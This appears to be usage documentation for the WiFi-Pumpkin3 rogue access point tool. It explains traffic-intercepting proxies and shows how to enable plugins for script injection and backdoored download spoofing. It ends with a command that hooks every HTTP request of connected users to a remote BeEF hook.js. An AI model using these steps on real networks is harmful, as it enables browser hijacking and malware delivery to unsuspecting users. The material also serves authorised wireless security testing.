The proxies are designed to add features to WP3 core and run parallel with access point (AP),
but redirect all traffic with `iptables`. Proxies work by intercepting a request, modifying the request if necessary, then handling or forwarding the request to its destination. When a user connects to a AP, the transparent proxy intercepts the request before passing it on to the provider.  

<Info title="Proxy Limitation">
Only one proxy can be run at a time, as each proxy is designed to **manipulate and redirect data packets** through a specific port.
</Info>

Avaliable proxies:

- **pumpkinproxy** - Proxy for intercept network traffic on TCP protocol [doc](#pumpkinproxy)
- **captiveflask** - Allow block Internet access for users until they open the page login page. [doc](#captiveflask)
- **noproxy** - Runnning without proxy redirect traffic

The basic command guidelines to get a plugins are:

if you want to select the proxy, follow command bellow. 
```bash
wp3 > set proxy proxy_name
```

if the proxy has plugins, when type `proxies` you see somes options for set. you can to enable/disable plugin command, type `tab` to autocomplete ;): 
```bash
wp3 > set proxy_name.plugin_name true/false
```

The example above is for enable/disable a plugin, but you can use same sintax to configure plugin paramenter. you can see this paramenter typing `info proxy_name` or using type like this example bellow, using `tab` to autocomplete.

```bash
wp3 > set pumpkinproxy.
pumpkinproxy.beef                            pumpkinproxy.html_inject
pumpkinproxy.beef.url_hook                   pumpkinproxy.html_inject.content_path
pumpkinproxy.downloadspoof                   pumpkinproxy.js_inject
pumpkinproxy.downloadspoof.backdoorExePath   pumpkinproxy.js_inject.url
pumpkinproxy.downloadspoof.backdoorPDFpath   pumpkinproxy.no-cache
pumpkinproxy.downloadspoof.backdoorWORDpath  pumpkinproxy.replaceImages
pumpkinproxy.downloadspoof.backdoorXLSpath   pumpkinproxy.replaceImages.path
wp3 > set pumpkinproxy.
```

let now set `url_hook` parameter the plugin beef to inject javascript in all request http.

```bash
wp3 > set pumpkinproxy.beef.url_hook http://172.16.149.141:3000/hook.js
```
